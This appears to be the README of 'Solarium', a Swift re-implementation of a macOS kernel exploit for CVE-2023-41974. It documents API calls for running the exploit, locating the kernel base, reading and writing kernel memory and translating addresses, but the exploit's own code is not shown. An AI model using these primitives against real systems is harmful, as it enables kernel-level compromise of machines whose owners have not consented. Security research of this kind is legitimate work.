# Solarium

A Work-in-Progress Swift re-implementation of [CVE-2023-41974](https://support.apple.com/en-us/120949). Kernel read/write uses ICMPv6 filter, taken from the DarkSword kernel exploit.

Tested on macOS 13.4.1 (22F82).

## Read-write Object
* Creare an eSocket object to run the exploit
```swift
let es = eSocket(count: )!
```
* Finding kernel base
```swift
let kb: UInt64 = es.getBase()
```
* Reading 32 bytes
```swift
let out: icmp6_filter = es.get32B(address: )!
```
* Writing 32 bytes
```swift
es.set32B(address: , bytes: )
```

## Virtual Address Translation
* Initializing virtual address translation
```swift
let vmsa = Translation(es: es)!
```
* Translating physical to kernel virtual address
```swift
let va = vmsa.phystokv(pa: )!
```
* Translating kernel virtual to physical address
```swift
let pa = vmsa.kvtophys(va: )!
```
* Validating kernel virtual address
```swift
let valid = vmsa.validateAddr(va: )
```
